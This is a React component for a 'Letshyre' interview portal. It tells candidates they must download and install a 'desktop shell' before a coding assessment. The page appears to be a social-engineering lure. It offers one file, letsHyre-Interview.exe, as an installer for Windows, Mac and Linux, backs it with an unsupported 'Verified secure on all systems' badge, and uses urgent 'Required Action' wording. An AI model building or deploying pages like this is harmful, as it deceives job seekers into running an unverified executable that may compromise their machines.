import React from "react";
import "./download-app.css";

export function DownloadApp() {
  return (
    <div className="portal-root">
      <main className="portal-content">
        {/* LEFT PANE */}
        <section className="copy-section">
          <div className="status-indicator">
            <span className="pulse" />
            System ready for session
          </div>

          <h1 className="title">
            Secure Desktop
            <br />
            Environment
          </h1>

          <p className="description">
            To start your assessment, you must use the Letshyre desktop shell.
            This creates an isolated workspace that ensures a stable,
            uninterrupted interview session across all platforms.
          </p>
        </section>

        {/* RIGHT PANE */}
        <section className="action-section">
          <div className="setup-box">
            <div className="setup-header">
              <span className="step-count">Required Action</span>
              <div className="os-icons">
                <svg
                  width="14"
                  height="14"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                >
                  <path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.401h-13.051M0 12.6h9.75v9.451L0 20.699m10.949-8.098H24V24l-13.051-2.102" />
                </svg>
                <svg
                  width="14"
                  height="14"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                >
                  <path d="M17.057 12.781c.032 2.588 2.254 3.462 2.287 3.477-.023.074-.351 1.201-1.146 2.365-.688.996-1.405 1.99-2.521 2.01-.11.002-.423-.005-.726-.005-1.121 0-1.474.68-2.731.68-1.256 0-1.657-.66-2.731-.68-.31-.005-.611.005-.718.005-1.116-.02-1.923-1.096-2.617-2.094-1.413-2.043-2.487-5.764-1.026-8.301.724-1.258 2.022-2.054 3.424-2.074.31-.002.611.002.721.002 1.053.02 1.372.69 2.631.69 1.259 0 1.53-.67 2.631-.69.11-.002.411-.004.721-.004 1.332.012 2.541.777 3.238 1.839-2.756 1.637-2.316 5.105.044 6.084zM15.19 3.699c.602-.731 1.007-1.745.897-2.759-.87.035-1.923.58-2.547 1.311-.559.645-.992 1.611-.863 2.607.971.076 1.91-.428 2.513-1.159z" />
                </svg>
              </div>
            </div>

            <div className="setup-body">
              <h2>Initialize Session</h2>
              <p>
                Download the unified installer to proceed to your secure coding
                workspace.
              </p>

              <a
                href="/download/letsHyre-Interview.exe"
                className="primary-download"
              >
                <span>Download for Desktop</span>
                <kbd>Win / Mac / Linux</kbd>
              </a>

              <div className="support-hint">
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.5"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>Verified secure on all systems</span>
              </div>

              <button
                className="secondary-link"
                onClick={() => window.location.reload()}
              >
                <span>I've finished the installation</span>
                <svg
                  width="14"
                  height="14"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.5"
                >
                  <path d="M5 12h14m-7-7l7 7-7 7" />
                </svg>
              </button>
            </div>
          </div>
        </section>
      </main>

      {/* FOOTER FIXED LOCK */}
      <footer className="portal-footer">
        <span>&copy; 2026 Letshyre Systems</span>
        <span className="spacer" />
        <span className="terminal-id">NODE_READY</span>
      </footer>
    </div>
  );
}
